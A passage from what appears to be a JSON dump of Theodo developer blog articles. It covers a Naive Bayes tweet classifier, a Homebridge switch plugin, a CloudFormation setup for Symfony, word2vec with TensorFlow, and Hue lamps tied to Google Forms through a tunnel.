(tweet).\n\nThere are perhaps some improvements that could be made to the tokenisation such as stop word removal and stemming, but let\u2019s see how this performs.\n\n(Checkout the implementation, it\u2019s ~300 lines of very readable Javascript.)\nWe can open up a fresh NPM project, require the Bayes package and jump into importing the JSON files\u2026 so far so good.\u00a0(Don\u2019t forget to NPM init and install)\n\r\nvar bayes = require('bayes');\r\nvar classifier = bayes();\r\nvar trumpTweets = require('./tweetFormatted.json');\r\nvar obamaTweets = require('./tweetFormatted2.json');\r\n\nNow training the model by iterating over the president\u2019s and then their tweets, using the tweet text attribute to get the content of the tweet. The classifier is trained with a simple call to the \u2018learn\u2019 function with each tweet.\n\r\nconst data = [{name: 'obama', tweets: obamaTweets}, {name: 'trump', tweets: trumpTweets}];\r\n\r\nfor (var president of data) {\r\n  console.log(`training model with historical ${president.name} data.`)\r\n  for (var tweet of president.tweets) {\r\n    classifier.learn(tweet.text, president.name);\r\n  }\r\n}\r\n\nGreat, let\u2019s try it out\u2026\n\r\nconsole.log(classifier.categorize('Lets build a wall!')); // Trump\r\nconsole.log(classifier.categorize('I will bear hillary')); // Trump\r\nconsole.log(classifier.categorize('Climate change is important.')); //Obama\r\nconsole.log(classifier.categorize('Obamacare has helped americans.')); //Obama\r\n\nOK! But that\u2019s not exactly scientific. Let\u2019s move to separating training and test data.\nModel Validation\nSplitting our historic data into test and training is a core principle for machine learning approaches. Training data is the data we train our model on and test data is that data we use to evaluate the model. We could take an arbitrary sample, but more interesting is to exclude each tweet individually from the training data, build a new model and then test with that individual tweet. This rotation can be used to find the average accuracy while taking advantage of as much training data as possible. In the world of ML statistics this method is called \u2018leave one out cross validation\u2019 or \u2018k-folds cross validation (with k=1)\u2019\nWe can achieve this exhaustive cross validation with a bit of loop logic and some counters.\nA basic working implementation counting false positives, true positives, false negatives and true negatives is as follows:\n\r\nvar bayes = require('bayes');\r\nvar classifier = bayes();\r\nvar trumpTweets = require('./tweetFormatted.json');\r\nvar obamaTweets = require('./tweetFormatted2.json');\r\n\r\nconst data = [{name: 'trump', tweets: trumpTweets}, {name: 'obama', tweets: obamaTweets}];\r\n\r\nvar totalDataCount = trumpTweets.length + obamaTweets.length;\r\nvar tp = 0;\r\nvar tn = 0;\r\nvar fp = 0;\r\nvar fn = 0;\r\n\r\nvar t0 = new Date().getTime();\r\n\r\n// Iterate through every historic data element index\r\nfor (var testIndex=0; testIndex&amp;lt;totalDataCount; testIndex++){\r\n  console.log(testIndex);\r\n  // instantiate a new model\r\n  var classifier = bayes();\r\n  var testData = [];\r\n  var counter = 0;\r\n  for (var president of data) {\r\n    for (var tweet of president.tweets) {\r\n      counter ++;\r\n      if (counter === testIndex) {\r\n        // If equal to test Index then ommit from training.\r\n        testData.push({president: president.name, tweet: tweet});\r\n      } else {\r\n        // Train on all other data elements.\r\n        classifier.learn(tweet.text, president.name);\r\n      }\r\n    }\r\n  }\r\n  // Use test data.\r\n  for (var test of testData) {\r\n    if (classifier.categorize(test.tweet.text) === test.president) {\r\n      if (test.president === 'obama') {\r\n        tp++;\r\n      } else {\r\n        tn ++;\r\n      }\r\n    } else {\r\n      if (test.president === 'obama') {\r\n        fp++;\r\n      } else {\r\n        fn++;\r\n      }\r\n    }\r\n  }\r\n}\r\nvar t1 = new Date().getTime();\r\n\r\nconsole.log('total tests: ', (tp + tn + fp + fn));\r\nconsole.log(`TP = ${tp}`);\r\nconsole.log(`TN = ${tn}`);\r\nconsole.log(`FP = ${fp}`);\r\nconsole.log(`FN = ${fn}`);\r\nconsole.log('Took ' + (t1 - t0) + ' milliseconds.')\r\n\nNow we wait for around 40 minutes (model validation execution not included in challenge time) for each of the 6,400 models to be trained and evaluated.\nIt\u2019s finished with an accuracy of 98%!\nWe can analyse the results as a \u2018confusion matrix\u2019\u00a0which tabulates all possible outcomes of classification success or failure (True positives (TP), False positives (FP), True Negatives (TN), False Negatives (FN)).\nThis is useful as accuracy alone is not a great measure for classifiers.\n\n\n\n\n\nPredicted\n\n\nActual\n\nObama\nTrump\n\n\nObama\n3195\n82\n\n\nTrump\n27\n3123\n\n\n\nFrom this we can calculate the accuracy of our model:\nAccuracy = TP + TN / TP +TN +FP +FN\nAccuracy = 3195 +3123 / \u00a03195 +3123 + 27 + 82\nAccuracy \u00a0= 0.98\n98 %\nDemo\nLive demo here:\u00a0https://benellerby.github.io/trump-obama-tweet-classifier/\nConclusion\nThis was obviously a very quick exercise in text classification using a Naive Bayesian Classifiers. We have not gone deeply into the subject, discussed Bayesian Probability or compared to other methods such as Support Vector Machines (SVM), k Nearest Neighbours (KNN) or Neural Networks. These areas are interesting, applicable and accessible without deep theoretical knowledge through libraries. I hope this quick tutorial will help you to see real world Machine Learning applications and learn by doing!\nOur key steps were:\n\nFind and clean the data\nChoose an approach (Bayesian Probability, SVM, KNN or Neural Networks\u2026)\nFind a library rather than \u2018recode the wheel\u2019\nModel Validation\nShare your results!\n\nNote: I challenged myself to do this in one hour, and the resulting accuracy of the model is surprising. I have not checked the data thoroughly for duplications due to time constraints, but if such an error has occurred that would contribute to the high accuracy seen. \nLet me know your results in the comments!\nTakeaways: \n\nYou can use machine learning techniques without going deep into maths and theory.\nThere are some great libraries to simplify machine learning application\nYou have access to more labelled historic data than you think; be creative.\n\nFurther Reading \n\nhttps://en.wikipedia.org/wiki/Feature_(machine_learning)\nhttps://en.wikipedia.org/wiki/Naive_Bayes_classifier\nhttps://en.wikipedia.org/wiki/Additive_smoothing\nhttps://en.wikipedia.org/wiki/Support_vector_machine\nhttps://en.wikipedia.org/wiki/K-nearest_neighbors_algorithm\nhttps://en.wikipedia.org/wiki/Machine_learning\nhttps://en.wikipedia.org/wiki/Artificial_neural_network\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBen Ellerby\r\n  \t\t\t\r\n  \t\t\t\tI'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. \r\n\r\nI'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.\r\n\r\nhttps://www.linkedin.com/in/benjaminellerby/  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhy Homekit?\nHomekit is a home accessories management framework developed by Apple.\nIt allows Apple devices\u2019 owners to control connected objects from different manufacturers using a single interface. It enhances Siri\u2019s capability to interpret commands intended for those devices.\nHomekit is particularly interesting, over other connected objects protocols like Home Assistance, if you own an iPhone and an AppleTV. Homekit is native on iPhone, allowing easy control of your appliances through Home app and quick access tab. The apple TV will behave as a hub allowing you to set up automation tasks and to control your home from outside of your home network.\nHow does it work?\nHomekit Accessory Protocol\nHomekit defines a layout for your home and your connected objects.\n\nHome: A home represents a single dwelling that has a network of accessories\nRoom: Each home may have multiple rooms and accessories added to each room.\nPlatform: A group of accessories.\nAccessory: An accessory is a physical home automation device.\nBridge: A bridge is a special type of accessory that allows you to communicate with accessories that can\u2019t communicate directly with HomeKit. For example, a bridge might be a hub for multiple lights that use a communication protocol other than HomeKit Accessory Protocol.\nService: A service correspond to an accessory\u2019s function. A garage door may have a service to open and close the door as well as another service to turn on and off the garage light.\nCharacteristic: Each service has a set of properties called characteristics. The garage door has a Current Door State and a Target Door State boolean. Each characteristic of a service identifies its current state. Each characteristic has 3 permission levels: read, write and notify. You can find a list of services and associated characteristics here.\n\nEach request made using your iOS devices Home application or Siri will use this layout to understand which object you want to act on and what action you would like to trigger.\nHowever, as of today, only a small number of Homekit enabled devices are available on the market. For other devices, you need a proxy between Homekit and your device. Most connected object manufacturers define their own way to interact with their devices (API and protocols). Your proxy will receive Homekit requests and translate them according to your device interface.\nHomebridge\nThe proxy used for this article is a NodeJS server called Homebridge written using HAP-node.js. Homebridge instantiate a Bridge Homekit object that you will be able to add through your Home application on your iOS devices. It then supports Plugins, which are community-contributed modules that provide a basic bridge from HomeKit to each of your various \u201csmart home\u201d devices.\nMany home automation devices plugins have already been developed by the community (like Nest, Lifx and even all of Home Assistant compatible devices).\nIf no plugin is available today for your object, this tutorial is made for you.\n\nWritting your own plugin\nPrerequisites\n\nYou need to have Homebridge installed and running on any device of your LAN. You can follow these instructions.\nYou need to add Homebridge as an accessory to your Home application on iOS.\n\nInstructions\nLet\u2019s code a plugin for a fake switch.\nCreate a new repository containing a package.json file to manage our dependancies, and a index.js file that will contain our plugin core logic.\nWe will made the following assumption regarding our switch API:\n\nit can be controlled through a RESTful API over HTTP protocol on our LAN\nthe switch IP address on our LAN is 192.168.0.10\nGET requests made to /api/status returns a boolean representing switch current state. Doing so will read the On characteristic of the switch\nPOST requests made to /api/order containing a boolean representing the switch target state will trigger the corresponding action. Doing so will set the On characteristic of the switch\n\nWe will create a Homebridge plugin registering a new Accessory with two services:\n\nAccessoryInformation service, required for every accessory, whatever the type, broadcasting information related to the device itself\nSwitch service, corresponding to our actual switch. Such service has a single On boolean required characteristic (check the list of services and corresponding characteristics)\n\nFirst, we need to inject our plugin within homebridge.\nmySwitch is the javascript object that will contain our control logic.\n\r\nconst Service, Characteristic;\r\n\r\nmodule.exports = function (homebridge) {\r\n  Service = homebridge.hap.Service;\r\n  Characteristic = homebridge.hap.Characteristic;\r\n  homebridge.registerAccessory(\"switch-plugin\", \"MyAwesomeSwitch\", mySwitch);\r\n};\r\n\nThe core logic built within HAP-node.js and Homebridge is located wihtin the getServices prototype function of mySwitch object.\nWe will instanciate our services in this function. We will also define which getter and setter of each characteristic of each service it shall call on every requests received from Homekit.\nWe need to instanciate :\n\nan AccessoryInformation service containing:\n\na Manufacturer characteristic\na Model characteristic\na SerialNumber characteristic\n\n\na Switch service containing:\n\nan On characteristic \u2013 the only required characteristic of this service\n\n\n\nUnlike AccessoryInformation service\u2019s characteristics, which are readable and can be set at plugin initialization, the On characteristic is writable and require a getter and setter.\n\r\nmySwitch.prototype = {\r\n  getServices: function () {\r\n    let informationService = new Service.AccessoryInformation();\r\n    informationService\r\n      .setCharacteristic(Characteristic.Manufacturer, \"My switch manufacturer\")\r\n      .setCharacteristic(Characteristic.Model, \"My switch model\")\r\n      .setCharacteristic(Characteristic.SerialNumber, \"123-456-789\");\r\n\r\n    let switchService = new Service.Switch(\"My switch\");\r\n    switchService\r\n      .getCharacteristic(Characteristic.On)\r\n        .on('get', this.getSwitchOnCharacteristic.bind(this))\r\n        .on('set', this.setSwitchOnCharacteristic.bind(this));\r\n\r\n    this.informationService = informationService;\r\n    this.switchService = switchService;\r\n    return [informationService, switchService];\r\n  }\r\n};\r\n\nWe will now write the logic of On characteristic getter and setter within dedicated prototype function of mySwitch object.\nWe will make the following assumption regarding the RESTful API offered by the switch :\n\nGET requests on http://192.168.0.10/api/status returns a { currentState: } reflecting the switch current state\nPOST requests on http://192.168.0.10/api/order sending a { targetState: } reflecting desired target state set the switch state\n\nWe will use request and url modules to perform our HTTP requests.\nOur configuration object, defined within Homebridge global configuration JSON, will contain both URLs described above.\n\r\nconst request = require('request');\r\nconst url = require('url');\r\n\r\nfunction mySwitch(log, config) {\r\n  this.log = log;\r\n  this.getUrl = url.parse(config['getUrl']);\r\n  this.postUrl = url.parse(config['postUrl']);\r\n}\r\n\r\nmySwitch.prototype = {\r\n\r\n  getSwitchOnCharacteristic: function (next) {\r\n    const me = this;\r\n    request({\r\n        url: me.getUrl,\r\n        method: 'GET',\r\n    }, \r\n    function (error, response, body) {\r\n      if (error) {\r\n        me.log('STATUS: ' + response.statusCode);\r\n        me.log(error.message);\r\n        return next(error);\r\n      }\r\n      return next(null, body.currentState);\r\n    });\r\n  },\r\n  \r\n  setSwitchOnCharacteristic: function (on, next) {\r\n    const me = this;\r\n    request({\r\n      url: me.postUrl,\r\n      body: {'targetState': on},\r\n      method: 'POST',\r\n      headers: {'Content-type': 'application/json'}\r\n    },\r\n    function (error, response) {\r\n      if (error) {\r\n        me.log('STATUS: ' + response.statusCode);\r\n        me.log(error.message);\r\n        return next(error);\r\n      }\r\n      return next();\r\n    });\r\n  }\r\n};\r\n\nWe can now add our newly created plugin to Homebridge by installing it globally:\nnpm install -g switch-plugin\nOpen the config.json file located in your Homebridge directory in your favorite text editor. In the accessory section, add info to the array:\n\r\n{\r\n  \"accessory\": \"MyAwesomeSwitch\",\r\n  \"getUrl\": \"http://192.168.0.10/api/status\",\r\n  \"postUrl\": \"http://192.168.0.10/api/order\"\r\n}\r\n\nRestart Homebridge and you shall now be able to switch on and off this fake switch through Home app on your iOS device.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFr\u00e9d\u00e9ric Barthelet\r\n  \t\t\t\r\n  \t\t\t\tCurrently developing loopback applications at Theodo. Also crazy about IoT and everything connected.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI decided to follow an advice shared on twitter via the The Practical Dev: the best way to learn AWS is to start using it.\nThe problem\nI was looking for a way to quickly create a Minimum Viable Stack on AWS with the following\u00a0properties:\n\nBe setup in less than 10min\nBe able to run a Symfony application\nUsing PostgreSQL on RDS\nDeployment is easy and fast\nNon AWS experts can create the MVS\n\nBut I couldn\u2019t find any out-of-the-box tools so I looked for a solution. Here I describe my journey which ended up with a ready-to-go CloudFormation configuration.\nElastic Beanstalk\nI started working with Elastic Beanstalk,\u00a0the PAAS of AWS,\u00a0which seemed to be exactly what I needed. Thanks to\u00a0this article on Elastic Beanstalk configuration files and this one on how to deploy a Symfony application,\u00a0I was able to run my application after some debugging cycles. My problem after that was that I couldn\u2019t\u00a0reuse my\u00a0configuration to recreate the whole environment (Elastic Beanstalk instances + RDS instance) for a\u00a0new project so I chose to experiment using CloudFormation.\nCloudFormation\nCloudFormation is an AWS service that creates a complete stack (VPC, load balancers, web servers, ..) from a template file.If you want to learn how to use CloudFormation, I recommend you to start by learning the basic templates. I started from a sample Elastic Beanstalk template and changed it so it can run a Symfony App.\u00a0Here are the steps you need to perform in order to use my template:\nStep 1: Because we will pass to the Elastic Beanstalk server the information to connect to the RDS postgresql database through environment variables, you need to update your parameters.yml with the following values:\ndatabase_host: \"%env(DB_HOST)%\"\r\ndatabase_port: 5432\r\ndatabase_name: \"%env(DB_NAME)%\"\r\ndatabase_user: \"%env(DB_USER)%\"\r\ndatabase_password: \"%env(DB_PASSWORD)%\"\r\n\nStep 2: Ensure you have specified the driver to \u201cpdo_pgsql\u201d in the \u201capp/config/config.yml\u201d file.\nStep 3: Upload a zip file with all your code to a s3 bucket. You create the zip file with this command:\nzip -r code.zip . --exclude=*vendors*`\nStep 4: Download my CloudFormation template.\nStep 5: Go to your AWS\u00a0console and open the CloudFormation and click on \u201ccreate new stack\u201d.\nStep 6: Enter the required\u00a0information:\n\nStep 7: Click on \u201cnext\u201d, \u201cnext\u201d and check \u201cI acknowledge that AWS CloudFormation might create IAM resources.\u201d. Then you can click on create. If everything is fine then you should\u00a0see something like this:\n\nStep 8\u00a0: You can check\u00a0the Elastic Beanstalk page to see if everything went okay\u00a0and find the url of your project at the top of the page.\n\nSecurity remark: the password of your database will be available on the AWS\u00a0console in the config section. A better solution would be to use\u00a0an s3 file that will be copied during the initialisation\u00a0of the Elastic Beanstalk container using .ebextensions files or using KMS and DynamoDB.\nConfigure the Elastic Beanstalk\u00a0environment\nYour site is online but you will want to update it. To do that you need to follow those steps:\n\nEnsure you don\u2019t have a .elasticbeanstalk directory\nRun\u00a0\u201ceb init\u201c, choose your region and the application you just created. You can find the name in the Elastic Beanstalk page.\n\nNow you are ready, you can deploy new version of your code simply with \u201ceb deploy\u201c.\nConclusion\nCloudFormation is a powerful tool with some drawbacks:\n\nIt only works with AWS\nIt\u2019s not easy to write beautiful code for the infrastructure\n\nTo help you write CloudFormation templates, you can try Troposphere. An alternative to\u00a0using CloudFormation is to use Terraform.\u00a0You can find\u00a0an objective benchmark between the two tools here.\nBonus: tips to debug your elastic beanstalk application\nHere are some tips\u00a0you may\u00a0need to debug you app:\n\nIf you are using GIT, to deploy the app on your EB\u00a0instance, you may need\u00a0to create a branch called \u201ccodecommit-origin\u201d\nYou can get the logs of the app in the EB\u00a0service on the aws console\nThe code that is deployed on your EB\u00a0instances is automatically stored in a S3 bucket that you can access on the AWS\u00a0console\nYou can ssh into the EB\u00a0instance with the \u201ceb ssh\u201d command\nThe application user is webapp\u00a0and you can get a bash with the following command: \u201csudo -u webapp /bin/bash\u201d. It\u2019s useful if you want to use the Symfony command without being root.\nIf you create through the aws console a RDS database the default name of the database is ebdb. You can find it\u00a0in the RDS service in the aws console\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhat is word vectorization?\nWord vectorization refers to a set of techniques that aims at extracting information from a text corpus and associating to each one of its word a vector. For example, we could associate the vector (1, 4, -3, 2) to the word king. This value is computed thanks to an algorithm that takes into account the word\u2019s context. For example, if we consider a context of size 1, the information we can extract from the following sentence:\nThe king rules his kingdom\nis a set of pairs:\n(the king), (king rules), (rules his), (his kingdom)\nIf we now consider another sentence:\nI see a king\nand the associated pairs:\n(I see), (see a), (a king)\nWe notice that we have 2 similar pairs across the 2 sets: (the king) and (a king)\nThe and a appear in the same context, so their associated vectors will tend to be similar.\nBy feeding the word vectorization algorithm a very large corpus (we are talking here about millions of words or more), we will obtain a vector mapping in which close values imply that the words appear in the same context and more generally have some kind of similarity, may it be syntactic or semantic.\nDepending on the text, we could have for example an area in the embedded space for programming languages, one for pronouns, one for numbers, and so on. I will give you a concrete example by the end of this article.\nOk, I get the concept, but why is it interesting?\nThis technique goes further than grouping words, it also enables algebraic operations between them. This is a consequence of the way the algorithm processes the text corpus. What it means is that you can do:\nking - man + woman\nand the result would be queen.\nIn other words, the word vectorization could have associated the following arbitrary values to the words below:\nking = (0, 1)\r\nqueen = (1, 2)\r\nman = (2, 1)\r\nwoman = (3, 2)\nAnd we would have the equality:\nking - man + woman = queen\r\n(0, 1) - (2, 1) + (3, 2) = (1, 2)\nIf the learning was good enough, the same will be possible for other relationships, like\nParis - France + Spain = Madrid\r\nfrontend + php - javascript = backend\nTo sum up, you can play with concepts by adding and subtracting them and get meaningful results from it, which is amazing!\nThe applications are multiple:\n\nYou can visualize the result by projecting the embedded space to a 2D space\nYou can use these vectors to feed another more ambitious machine learning algorithm (a neural network, a SVM, etc.). The ultimate goal is to allow machines to understand human language, not by learning it by heart but by having a structured representation of it, as opposed to more basic representations such as 1-hot-encoding like the following, where each dimension is a word:\n\nthe = (1, 0, 0, 0, 0, 0, 0)\r\na = (0, 1, 0, 0, 0, 0, 0)\r\nking = (0, 0, 1, 0, 0, 0, 0)\r\nqueen = (0, 0, 0, 1, 0, 0, 0)\r\nman = (0, 0, 0, 0, 1, 0, 0)\r\nwoman = (0, 0, 0, 0, 0, 1, 0)\r\nhis = (0, 0, 0, 0, 0, 0, 1)\nSounds great! Where do I start?\nThe tutorial below shows how to simply achieve and visualize a word vectorization using the Python Tensorflow library. For information I will use the Skip-gram model, which tends to learn faster than its counterpart the Continuous Bag-of-Words model. Detailing the difference is out of the scope of this article but don\u2019t hesitate to look it up if you want!\nI was curious about what I would get by running the algorithm with a text corpus made of all the articles from the Theodo blog, so I used the BeautifulSoup python library to gather the data and clean it. For information there are about 300 articles, each one containing an average of 1200 words, which is a total of 360 000 words. This is very little but enough to see some interesting results.\nStep 1: Build the dataset\nWe first need to load the data, for example from a file:\nfilename = 'my_text.txt'with open(filename, \"r+\") as f:\r\n    data = tf.compat.as_str(f.read())\nThen we strip it from its punctuation and split it in an array of words:\ndata = data.translate(None, string.punctuation)\r\ndata = data.split()\nAnd we homogenize the data:\nwords = []\r\nfor word in data:\r\n    if word.isalpha():\r\n        words.append(word.lower())\r\n    elif is_number(word):\r\n        words.append(word)\nThe data should now look like the following:\n[the, day, words, became, vectors, what, is, word, vectorization, ...]\nWe also need to adapt the data so it has the structure the algorithm expects. This begins to be a bit technical, so I advise you to use functions from the official word2vec examples you can find here. You should use the build_dataset\u00a0(line 66) function with as arguments the words array you built before and the size of the vocabulary you want. Indeed it is a good practice to remove the words that don\u2019t appear often, as they will slow down the training and they won\u2019t bring any meaningful result anyway.\nStep 2: Train the model\nNow that we have our dataset, we need to build our set of batches, or contexts, as explained previously, remember:\n(the king), (king rules), (rules, his), (his kingdom)\nTo do this, we use the generate_batch function.\nTo properly train the model, you can look at the end of the example (line 131)\u00a0. All parameters\u2019 purpose is detailed, but in my opinion the ones that are worth tweaking when you begin are:\n\nembedding_size: the dimension of the resulting vector depends on the size of your dataset. A dimension too small will reduce the complexity your embedded space can grasp, a dimension too big may hinder your training.\u00a0To start I recommend to keep the default value of 128.\nskip_window: the size of the context. It is safe to start with one, i.e. considering only neighbours, but I encourage you to experiment with higher values.\nnumber_of_steps: Depending on your corpus size and your machine CPU, you should adapt this if you don\u2019t want to wait too long for your results. For my corpus it took around 4 minutes to complete the 100 000 steps.\n\nStep 3: Analyze the results\nThe word2vec example lets us visualize the result by reducing the dimension from a very large value (128 if you stick to default) to 2D. For information it uses a t-SNE algorithm, which is well-suited for visualizing high-dimensional data as it preserves as much as possible the relative distance between neighbours.\nHere is the result I got:\n\n\u00a0\nIt is too dense to read, so see below an extract of what I got from my dataset:\n\u00a0\n\nWe can see we have an area with pronouns in the top, and one with auxiliaries to the left.\nThe relations highlighted just above were syntactic ones. On this other extract, we see semantic similarities:\n\u00a0\n\nThe algorithm learned that node is a backend framework!\nHowever with these few words, the model was not good enough to perform meaningful operations between vectors. I guess Theodoers need to write more blog articles to feed the word vectorization algorithm!\nYou can see below what word vectorization is capable of with this example coming from the Tensorflow page:\n\nConclusion\nI hope that I managed in this article to share my enthusiasm for the rise of word vectorization and all the crazy applications that could ensue! If you are interested, I encourage you to look at papers that treat this subject more deeply:\n\nA more complete implementation example with\u00a0Tensorflow\nYou can also dive into this Kaggle competition\u00a0that contains a lot of information about how to tackle a real use case\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlexandre Blondin\r\n  \t\t\t\r\n  \t\t\t\tDevelopper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis article is about IOT, DIY and lamps, and a little bit of lean.\n\nSo 2 weeks ago we bought some lamps! And since we are a bunch of nerds we bought a bridge to play with them.\nI am not going to hide the brand to make this article clearer.\nSo we had this lamp and this bridge\n\n\nAnd then we wondered what we could do with it \ud83d\ude10 .\nWe love our clients\nEvery week, the scrum team of a project asks their client if they are satisfied with 3 questions:\n1) How do you feel about the speed of the team?\n2) How do you feel about the quality of the collaboration with Theodo?\n3) Would you recommend Theodo?\nDepending on the answer there are 3 categories:\n\nKO: red bucket, the client is not satisfied we need to react\nOK: the client satisfaction meets our standard\nWahou!: the client gave us the perfect grade\n\nWe had our idea! We are a lean company, we want indicators. Whenever a client fills the google form, we are going to change the lamp color according to the result \ud83d\ude00 .\nHow do we do this ?\n\nHere is the plan:\n\nConfigure the lamps in the office\nExpose the API so we can control it from anywhere\nCreate a hook on our google form to call the API and thus control the lamp\n\n\u2014 easy \u2014\nConfigure your office lamps\n1) Plug the lamps\n2) Plug the bridge to your router\n3) Download the HUE app to see if everything is connected\n4) Play with the lamps because you are a child\nAccess the API of the bridge\n1) Connect to the same wifi the bridge is on\n2) Go here to get the IP address of your bridge\n[\r\n    {\r\n        id: \"skjdhfskdjfhskkjdf\",\r\n        internalipaddress: \"192.168.1.107\"\r\n    }\r\n]\r\n\n3) We want to play with the API: copy the ip in the url and add /debug/clip.htm: mine is http://192.168.1.107/debug/clip.html\n4) We need a token to be authenticated: copy the following body in the message body part (but change the name, you are not Sammy)\n{\"devicetype\":\"my_hue_app#nexus Sammy\"}\r\n\n\n5) Click post \u2013 it will say there is an error because you need to press the button of the bridge before getting an access, so click on the button of the bridge and click post again\n6) You now have a Token! (if you had trouble having a token read this).\nWe can now turn the light on and off! Or change its color more fun. Here is the doc.\nWhat we will use is this request:\nAddress    http:///api//groups/0/action\r\nBody    {\"on\":true,\"bri\":255,\"sat\":255,\"hue\":12345}\r\nMethod    PUT\r\n\nChange the color when a new form is submitted\nNow let\u2019s say you have a Google form (create one just for fun).\nWe are going to put a small Google script to run a function when a new form is submitted.\nIf you know nothing in Google script it is ok, it is javascript.\n\nOn the form, click on the menu on the right hand top\nSelect \u201cScript Editor\u201d\nAnd then paste and adapt this code:\nfunction changeLightColors(colorCode) {\r\n  var formData = {\r\n    \"hue\": colorCode\r\n  }\r\n\r\n  var options = {\r\n   'method' : 'put',\r\n    'payload' : JSON.stringify(formData)\r\n  }\r\n  var url = \"http://7b581ba2.ngrok.io/api/put-your-token/groups/1/action\"\r\n  UrlFetchApp.fetch(url, options)\r\n}\r\n\nHere is the code we call each time there is a new form submitted\nfunction isNewFormOK(newForm) {\r\n  response = newForm.response.getItemResponses()\r\n  speed = parseInt(response[0].getResponse()[0])\r\n  colab = parseInt(response[1].getResponse()[0])\r\n  reco = response[4].getResponse()\r\n  if ((speed + colab > 7) && (reco === 'Yes, absolutely')) {\r\n    if (speed + colab === 10) {\r\n      changeLightColors(24173)\r\n    } else {\r\n      changeLightColors(8464)\r\n    }\r\n  } else {\r\n    changeLightColors(65423)\r\n  }\r\n}\r\n\nBUT!\nIn the changeColorLight function we fetch a weird URL. That\u2019s right, we need to access our hue bridge from the outside world, while the bridge is only on our local wifi. One way to do it is openning a http tunnel with Ngrock\nAccess the lights from the outside world\nFix the local ip address of the bridge\nDHCP might change the bridge adress every now and then, you don\u2019t want that. Look up in google: {{your router model}} assign static IP. Fix the ip address of the bridge.\nAccess the bridge from the outside\nIf like me you don\u2019t have a fixed ip address because your internet provider does not want you to! There is a free solution: \n\ninstall beame-instal-ssl\nrun beame-insta-ssl tunnel make --dst 192.168.0.4:80 --proto http (replace the static ip of your bridge)\nyou now see an beame url you can access !\n\nBeame is nice because you get to keep the address even if you relaunch the tunnel.\nConfigure an IOT Hub\nNow, maybe your computer won\u2019t always be on the same wifi than the lights.\nFirst, fix the local IP of your hub so it does not change when you restart your router (look for DHCP reservation + your router brand).\nYou can run the tunnel on a raspberry pi:\n\ncreate a file launch-tunnel.sh in the pi directory\nin the file, write: sudo -u pi /usr/bin/beame-instal-ssl tunnel make --dst 192.168.1.4:80 --proto http > /home/pi/beame.log & (replace with the local IP of your hub of course)\nin /etc/rc.local add /home/pi/beame-tunnel.sh\naccess the beame url of your tunnel to make sure it works\n\n\nWatch the status of your IOT Hub with a simple HealthCheck\nThere are many services that provide healthcheck reports.\nI chose a simple google script that checks every hours the status of my endpoint. If the response is 200, do nothing, else send me a mail.\nTo create a google script:\n\nOpen a new google spread sheet\ntool -> open script editor\nin the script editor copy this code (replace the URLOFIOTHUB and YOUREMAILADDRESSS):\n\nfunction healthCheck() {\r\n  url = \"https://URLOFIOTHUB\"\r\n  thereIsAnIssue = false\r\n  try {\r\n    response = UrlFetchApp.fetch(url)\r\n    if(response.getResponseCode() != \"200\") {\r\n      thereIsAnIssue = true\r\n      issue = \"IOT Hub response was not 200 but \" + response.getResponseCode()\r\n    }\r\n  } catch(e) {\r\n    thereIsAnIssue = true\r\n    issue = e\r\n  }\r\n\r\n  if(thereIsAnIssue) {\r\n    sendIssueMail(issue, url)\r\n  }\r\n}\r\n\r\nfunction sendIssueMail(issue, url) {\r\n  message = \"There was an isue with the IOT Hub.\\n\"\r\n  message += \"The following url has an issue: \" + url + \"\\n\"\r\n  message += \"The issue was the following: \" + issue + \"\\n\"\r\n  message += \"You may try to reboot the IOT Hub, behind the orange fridge.\"\r\n  Logger.log(message)\r\n  email = {\r\n    to: \"YOUREMAILADDRESSS\",\r\n    replyTo: \"YOUREMAILADDRESSS\",\r\n    subject: \"IOT Hub is down!\",\r\n    htmlBody: message\r\n  }\r\n  MailApp.sendEmail(email);\r\n}\r\n\nTest the code with a fake url:\n\nReplace the url by a fake one that should not exist\nin the menu bar select HealthCheck() function\nrun the function by clicking the little play arrow\nReceive the mail\n\nAutomate the check:\n\nIn the script go to 